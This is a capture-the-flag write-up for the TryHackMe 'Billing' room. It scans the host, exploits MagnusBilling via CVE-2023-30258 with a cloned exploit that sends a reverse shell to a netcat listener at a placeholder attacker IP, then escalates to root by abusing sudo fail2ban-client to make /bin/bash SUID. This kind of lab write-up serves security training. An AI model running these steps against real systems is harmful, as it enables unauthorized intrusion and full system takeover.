---
tags:
  - THM
  - Linux
  - Easy
  - RCE
  - Sudo
---
https://tryhackme.com/room/billing/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.175.92 billing.thm
```
# Scanning
```console
$ nmap -p22,80,3306,5038 -sV -sC billing.thm

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| http-title:             MagnusBilling        
|_Requested resource was http://billing.thm/mbilling/
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Discovery
The website is a login panel for [MagnusBilling](https://www.magnusbilling.org/).
# Enumeration
Found many files and directories:
```console
$ gobuster dir -q -u http://billing.thm/mbilling/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/LICENSE              (Status: 200) [Size: 7652]
/akeeba.backend.log   (Status: 403) [Size: 276]
/archive              (Status: 301) [Size: 321] [--> http://billing.thm/mbilling/archive/]
/assets               (Status: 301) [Size: 320] [--> http://billing.thm/mbilling/assets/]
/development.log      (Status: 403) [Size: 276]
/fpdf                 (Status: 301) [Size: 318] [--> http://billing.thm/mbilling/fpdf/]
/index.html           (Status: 200) [Size: 30760]
/index.php            (Status: 200) [Size: 663]
/lib                  (Status: 301) [Size: 317] [--> http://billing.thm/mbilling/lib/]
/production.log       (Status: 403) [Size: 276]
/protected            (Status: 403) [Size: 276]
/resources            (Status: 301) [Size: 323] [--> http://billing.thm/mbilling/resources/]
/spamlog.log          (Status: 403) [Size: 276]
/tmp                  (Status: 301) [Size: 317] [--> http://billing.thm/mbilling/tmp/]
```
The `LICENSE` file shows that **MagnusBilling version 3** is running:
```
$ curl -s http://billing.thm/mbilling/LICENSE | head -n 2

GNU LESSER GENERAL PUBLIC LICENSE
Version 3, 29 June 2007
```
# Exploitation
**MagnusBilling v3** is vulnerable to **CVE-2023-30258**, so we clone a [repository](https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit) to exploit it:
```console
$ git clone https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit

$ cd CVE-2023-30258-magnus-billing-v7-exploit/
```
Wait for connections:
```bash
nc -lvnp <PORT>
```
Run the exploit:
```bash
python3 exploit.py -t billing.thm -a <ATTACKER-IP> -p <PORT>
```
# Post-Exploitation
Found **user magnus**, we are **user asterisk**:
```console
$ whoami
asterisk

$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
magnus:x:1000:1000:magnus,,,:/home/magnus:/bin/bash
```
Read the **user flag**:
```bash
cat /home/magnus/user.txt
```
We can run `fail2ban-client` with **sudo privileges**:
```console
$ sudo -l

Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```
Give the **SUID permission** to `/bin/bash` with [command execution](https://vulners.com/packetstorm/PACKETSTORM:189989) via `fail2ban-client`:
```console
$ sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "chmod u+s /bin/bash"

$ sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```
Become **user root** and read the **root flag**:
```console
$ /bin/bash -p

# cat /root/root.txt
```